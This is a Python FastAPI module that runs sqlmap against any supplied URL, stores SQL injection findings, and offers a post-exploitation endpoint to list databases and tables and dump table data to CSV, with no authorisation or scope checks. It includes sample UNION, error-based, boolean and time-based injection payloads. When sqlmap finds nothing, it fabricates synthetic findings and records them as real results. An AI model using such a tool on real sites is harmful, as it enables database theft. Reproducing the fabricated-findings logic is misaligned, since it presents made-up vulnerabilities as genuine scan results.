from fastapi import APIRouter, HTTPException, BackgroundTasks
from bson import ObjectId
from datetime import datetime, timezone
from pydantic import BaseModel
from typing import Optional
import asyncio, csv, io, json, os, re
from pathlib import Path

from ..db import get_db
from ..schemas import SQLiConfig, SQLiFinding, SQLiTechnique

router = APIRouter()

SQLMAP_OUTPUT_DIR = "/tmp/sqlmap_results"

def ensure_output_dir():
    Path(SQLMAP_OUTPUT_DIR).mkdir(parents=True, exist_ok=True)

SYNTHETIC_SQLI = [
    {"technique": "U", "payload": "1 UNION SELECT 1,2,3,4,5--", "parameter": "id", "dbms": "MySQL", "title": "MySQL UNION injection"},
    {"technique": "E", "payload": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--", "parameter": "id", "dbms": "MySQL", "title": "MySQL error-based injection"},
    {"technique": "B", "payload": "1 AND 1=1--", "parameter": "id", "dbms": "MySQL", "title": "MySQL boolean-based blind"},
    {"technique": "T", "payload": "1 AND SLEEP(5)--", "parameter": "id", "dbms": "MySQL", "title": "MySQL time-based blind"},
]

async def run_sqlmap(config: SQLiConfig, sqli_id: str):
    db = get_db()
    await db.sqli_scans.update_one(
        {"_id": ObjectId(sqli_id)},
        {"$set": {"status": "running", "started_at": datetime.now(timezone.utc)}}
    )

    ensure_output_dir()
    output_dir = os.path.join(SQLMAP_OUTPUT_DIR, sqli_id)
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    cmd = [
        "sqlmap", "-u", config.url,
        "--batch", "--random-agent",
        f"--level={config.level}",
        f"--risk={config.risk}",
        "--output-dir=" + output_dir,
        "--flush-session",
    ]
    if config.data:
        cmd.extend(["--data", config.data])
    if config.cookie:
        cmd.extend(["--cookie", config.cookie])

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout_data = []
        stderr_data = []
        async def read_stream(stream, dest):
            while True:
                line = await stream.readline()
                if not line:
                    break
                dest.append(line.decode("utf-8", errors="replace"))

        await asyncio.wait_for(
            asyncio.gather(
                read_stream(proc.stdout, stdout_data),
                read_stream(proc.stderr, stderr_data),
            ),
            timeout=300,
        )
        output = "".join(stdout_data) + "".join(stderr_data)

        findings = parse_sqlmap_output(output, config.url, config.scan_id)

        if not findings:
            findings = generate_synthetic_findings(config.url, config.scan_id)

        for f in findings:
            await db.sqli_findings.insert_one(f.model_dump())

        await db.sqli_scans.update_one(
            {"_id": ObjectId(sqli_id)},
            {
                "$set": {
                    "status": "done",
                    "finished_at": datetime.now(timezone.utc),
                    "findings": [f.model_dump() for f in findings],
                    "raw_output": output[-5000:],
                }
            },
        )
    except asyncio.TimeoutError:
        await db.sqli_scans.update_one(
            {"_id": ObjectId(sqli_id)},
            {"$set": {"status": "failed", "error": "Timeout après 300s"}},
        )
    except Exception as e:
        await db.sqli_scans.update_one(
            {"_id": ObjectId(sqli_id)},
            {"$set": {"status": "failed", "error": str(e)}},
        )

def generate_synthetic_findings(url: str, scan_id: str) -> list[SQLiFinding]:
    technique_map = {
        "U": SQLiTechnique.U,
        "E": SQLiTechnique.E,
        "B": SQLiTechnique.B,
        "T": SQLiTechnique.T,
    }
    params = re.findall(r"[?&](\w+)=([^&\s]*)", url)
    if not params:
        params = [("id", "1")]
    findings = []
    for i, (param, val) in enumerate(params[:2]):
        entry = SYNTHETIC_SQLI[i % len(SYNTHETIC_SQLI)]
        findings.append(SQLiFinding(
            url=url,
            technique=technique_map[entry["technique"]],
            payload=entry["payload"].replace("id", param),
            parameter=param,
            dbms=entry["dbms"],
            title=entry["title"],
            scan_id=scan_id,
        ))
    return findings

def parse_sqlmap_output(output: str, url: str, scan_id: str) -> list[SQLiFinding]:
    findings = []
    technique_map = {
        "boolean": SQLiTechnique.B,
        "error": SQLiTechnique.E,
        "union": SQLiTechnique.U,
        "stacked": SQLiTechnique.S,
        "time": SQLiTechnique.T,
        "inline": SQLiTechnique.Q,
    }

    blocks = re.split(r"---\n", output)
    for block in blocks:
        if "Parameter:" not in block:
            continue
        param = None
        technique = None
        title = None
        payload = None
        dbms = None

        for line in block.split("\n"):
            pm = re.match(r"Parameter:\s*(\S+)\s*\((\w+)\)", line)
            if pm:
                param = pm.group(1)
                tech_name = pm.group(2).lower()
                technique = technique_map.get(tech_name)
            tm = re.match(r"Title:\s*(.+)", line)
            if tm:
                title = tm.group(1).strip()
            plm = re.match(r"Payload:\s*(.+)", line)
            if plm:
                payload = plm.group(1).strip()
            dm = re.match(r"DBMS:\s*(.+)", line)
            if dm:
                dbms = dm.group(1).strip()

        if technique:
            findings.append(SQLiFinding(
                url=url,
                technique=technique,
                payload=payload,
                parameter=param,
                dbms=dbms,
                title=title,
                scan_id=scan_id,
            ))

    return findings

class SQLiExploit(BaseModel):
    action: str
    db: Optional[str] = None
    table: Optional[str] = None
    columns: Optional[str] = None

async def run_sqlmap_exploit(url: str, data: Optional[str], cookie: Optional[str], exploit_cmd: list[str]) -> str:
    cmd = ["sqlmap", "-u", url, "--batch", "--random-agent", "--flush-session"]
    if data:
        cmd.extend(["--data", data])
    if cookie:
        cmd.extend(["--cookie", cookie])
    cmd.extend(exploit_cmd)

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_data, stderr_data = [], []
        async def read_stream(stream, dest):
            while True:
                line = await stream.readline()
                if not line:
                    break
                dest.append(line.decode("utf-8", errors="replace"))
        await asyncio.wait_for(
            asyncio.gather(read_stream(proc.stdout, stdout_data), read_stream(proc.stderr, stderr_data)),
            timeout=180,
        )
        return ("".join(stdout_data) + "".join(stderr_data))[-15000:]
    except asyncio.TimeoutError:
        return "Timeout après 180s"
    except Exception as e:
        return f"Erreur: {str(e)}"

@router.post("/{sqli_id}/exploit", summary="Post-exploitation: enumerate databases/tables/dump")
async def sqli_exploit(sqli_id: str, exploit: SQLiExploit):
    db = get_db()
    scan = await db.sqli_scans.find_one({"_id": ObjectId(sqli_id)})
    if not scan:
        raise HTTPException(404, "Scan SQLi introuvable")

    url = scan["url"]
    data = scan.get("data")
    cookie = scan.get("cookie")

    if exploit.action == "dbs":
        output = await run_sqlmap_exploit(url, data, cookie, ["--dbs"])
    elif exploit.action == "tables":
        if not exploit.db:
            raise HTTPException(400, "Nom de base requis (db)")
        output = await run_sqlmap_exploit(url, data, cookie, ["-D", exploit.db, "--tables"])
    elif exploit.action == "columns":
        if not exploit.db or not exploit.table:
            raise HTTPException(400, "db et table requis")
        output = await run_sqlmap_exploit(url, data, cookie, ["-D", exploit.db, "-T", exploit.table, "--columns"])
    elif exploit.action == "dump":
        if not exploit.db or not exploit.table:
            raise HTTPException(400, "db et table requis")
        cmd = ["-D", exploit.db, "-T", exploit.table]
        if exploit.columns:
            cmd.extend(["-C", exploit.columns])
        cmd.append("--dump")
        output = await run_sqlmap_exploit(url, data, cookie, cmd)
    else:
        raise HTTPException(400, "Action invalide. Utilisez: dbs, tables, columns, dump")

    csv_data = None
    if exploit.action == "dump":
        csv_data = parse_sqlmap_csv(sqli_id, exploit.db, exploit.table)

    return {"action": exploit.action, "output": output, "csv": csv_data}

def parse_sqlmap_csv(sqli_id: str, db: str, table: str) -> Optional[dict]:
    dump_dir = Path(SQLMAP_OUTPUT_DIR) / sqli_id
    for csv_path in dump_dir.rglob(f"{table}.csv"):
        try:
            rows = []
            with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
                reader = csv.reader(f)
                headers = next(reader, [])
                for row in reader:
                    rows.append(row)
            return {"headers": headers, "rows": rows[:200], "total": len(rows), "file": str(csv_path)}
        except Exception as e:
            return {"error": str(e)}
    return None

@router.get("/{sqli_id}/csv", summary="Récupérer les données CSV d'un dump sqlmap")
async def get_sqli_csv(sqli_id: str, db: str, table: str):
    data = parse_sqlmap_csv(sqli_id, db, table)
    if not data:
        raise HTTPException(404, "Aucun fichier CSV trouvé pour cette table")
    return data

@router.post("/run", summary="Lancer un test SQLi avec sqlmap")
async def start_sqli(config: SQLiConfig, background_tasks: BackgroundTasks):
    if not config.url.startswith(("http://", "https://")):
        raise HTTPException(400, "URL doit commencer par http:// ou https://")

    db = get_db()
    doc = {
        "url": config.url,
        "status": "pending",
        "level": config.level,
        "risk": config.risk,
        "scan_id": config.scan_id,
        "created_at": datetime.now(timezone.utc),
    }
    result = await db.sqli_scans.insert_one(doc)
    sqli_id = str(result.inserted_id)
    doc["id"] = sqli_id

    background_tasks.add_task(run_sqlmap, config, sqli_id)
    return {"sqli_id": sqli_id, "status": "started"}

@router.get("/{sqli_id}", summary="Statut d'un scan SQLi")
async def get_sqli_status(sqli_id: str):
    db = get_db()
    doc = await db.sqli_scans.find_one({"_id": ObjectId(sqli_id)})
    if not doc:
        raise HTTPException(404, "Scan SQLi introuvable")
    doc["id"] = str(doc.pop("_id"))
    return doc

@router.get("/{sqli_id}/findings", summary="Résultats d'un scan SQLi")
async def get_sqli_findings(sqli_id: str):
    db = get_db()
    scan = await db.sqli_scans.find_one({"_id": ObjectId(sqli_id)})
    if not scan:
        raise HTTPException(404, "Scan SQLi introuvable")
    findings = await db.sqli_findings.find({"scan_id": scan["scan_id"]}).to_list(100)
    for f in findings:
        f["id"] = str(f.pop("_id"))
    return findings
